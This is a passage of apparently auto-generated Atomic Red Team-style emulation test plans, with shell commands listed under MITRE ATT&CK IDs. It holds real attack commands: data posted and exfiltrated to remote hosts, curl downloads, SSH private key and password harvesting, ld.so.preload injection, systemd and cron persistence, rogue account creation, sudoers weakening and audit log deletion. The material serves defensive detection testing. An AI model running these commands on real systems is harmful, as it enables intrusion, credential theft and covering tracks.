echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1501 ,T1064 ,T1139 ,T1057 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1158 ,T1154 ,T1145 ,T1033 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1136 ,T1064 ,T1139 ,T1087 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1136 ,T1154 ,T1040 ,T1201 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1168 ,T1153 ,T1081 ,T1018 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1215 ,T1154 ,T1040 ,T1201 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1168 ,T1153 ,T1145 ,T1217 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1215 ,T1153 ,T1081 ,T1135 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1501 ,T1064 ,T1040 ,T1201 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1215 ,T1064 ,T1145 ,T1082 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1158 ,T1154 ,T1081 ,T1135 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1158 ,T1153 ,T1139 ,T1087 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1154 ,T1139 ,T1135 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

